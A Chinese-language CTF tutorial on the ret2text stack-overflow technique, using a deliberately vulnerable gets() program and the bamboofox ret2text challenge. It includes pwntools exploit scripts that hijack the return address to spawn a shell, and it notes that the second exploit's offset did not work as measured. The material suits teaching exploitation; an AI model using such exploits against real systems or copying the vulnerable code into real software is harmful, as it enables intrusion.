> 参考资料：[https://www.dazhuanlan.com/2019/08/22/5d5e50ffd26cc/](https://www.dazhuanlan.com/2019/08/22/5d5e50ffd26cc/)
>
> [https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/](https://wiki.x10sec.org/pwn/stackoverflow/basic_rop/)
>



> 附件：
>
> 链接：[https://pan.baidu.com/s/19_uY_4B0o6X_2k4tbjqRQA](https://pan.baidu.com/s/19_uY_4B0o6X_2k4tbjqRQA)
>
> 提取码：7a6r 
>

### 原理
**<font style="color:#F5222D;">ret2text 即控制程序执行程序本身已有的的代码(.text)。</font>**其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。

这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。

> 顾名思义，ret2text（ret to text），也就是说我们的利用点在原文件中寻找相对应的代码即可（进程存在危险函数如system("/bin")或execv("/bin/sh")的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。），控制程序执行程序本身已有的的代码 (.text)。
>

### 利用前提
开启了NX，栈上无法写入shellcode

> shellcode包含system("/bin/sh")等
>
> 当NX保护开启，就表示题目给了你system（'/bin/sh'），如果关闭，表示你需要自己去构造shellcode
>

### 示例讲解
> ret2text和栈溢出极其相像，毕竟ROP的基本点是栈溢出
>

先来个示例吧，代码如下：

```c
void test(){
	system("/bin/sh");
}
int main(){
	char buf[20];
	gets(buf);
    return 0;
}
```

> 为了方便我们关闭保护，使用kali2019.2版本进行编译：
>
>  gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o test
>

编译日志如下：

```bash
root@kali:~/桌面/CTF# gcc -fno-stack-protector -z execstack -z norelro -no-pie test.c -o test
test.c: In function ‘test’:
test.c:2:2: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
  system("/bin/sh");
  ^~~~~~
test.c: In function ‘main’:
test.c:6:2: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
  gets(buf);
  ^~~~
/usr/bin/ld: /tmp/ccAUtKKs.o: in function `main':
test.c:(.text+0x2d): 警告：the `gets' function is dangerous and should not be used.
root@kali:~/桌面/CTF#
```

检查一下文件保护：

```bash
root@kali:~/桌面/CTF# pwn checksec --file=test
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/CTF/test'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
root@kali:~/桌面/CTF# 
```

所有保护已关闭，我们的目的是为了getshell，所以思路是，填充满缓冲区，然后劫持EIP到test函数的地址上。

将文件载入IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596365180247-7b131a4b-1435-4200-bd58-d4904e3715b2.png)

查看main函数的栈：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596365211366-3a533148-20d1-4238-a73b-ae9bda836c77.png)

r代表的是main函数的栈底，紧接着就是返回地址，因此我们有：

> 代码看不懂的请移步至栈溢出小节（kali自带pwntools）
>

```bash
from pwn import *
p = process("./test")
offset = 40
addr = 0x401132 #0x401132为后门函数地址
payload = 'a' * offset + p64(addr)
p.sendline(payload)
p.interactive()
```

运行一下：

```bash
root@kali:~/桌面/CTF# python 1.py
[+] Starting local process './test': pid 3214
[*] Switching to interactive mode
$ ls
1.py  test  test.c
$  
```

成功getshell

### 开始实战
> 文件下载地址：
>
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text)
>
> 请注意这是32位文件
>

将文件直接扔进IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596365897604-c89f9ee3-fb09-4135-ac8b-3f064ef47b54.png)

发现容易引起栈溢出的函数gets

顺带看一下文件的保护：

```powershell
root@kali:~/桌面/CTF# pwn checksec --file=ret2text
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/CTF/ret2text'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
root@kali:~/桌面/CTF# 
```

在ELF文件中又发现了后门函数secure

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596366069491-40598dbe-a994-443a-a7c6-875e39f23d95.png)

看一下汇编：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1596366182493-6b8000d7-1426-4035-a6d0-40018d39a50d.png)

在 secure 函数又发现了存在调用 system("/bin/sh") 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。

> 可以在伪代码里看到，虽然前面有getshell的验证，但是直接劫持EIP到0x0804863A就行了
>

同理得exp如下：

```powershell
from pwn import *
p = process('./ret2text')
target = 0x804863a
p.sendline('A' * (0x6C+4) + p32(target))
p.interactive()
```

> 这里IDA测得的s栈长度为64+4，经过测试无法getshell，下一节将讲解手动测量栈长度
>

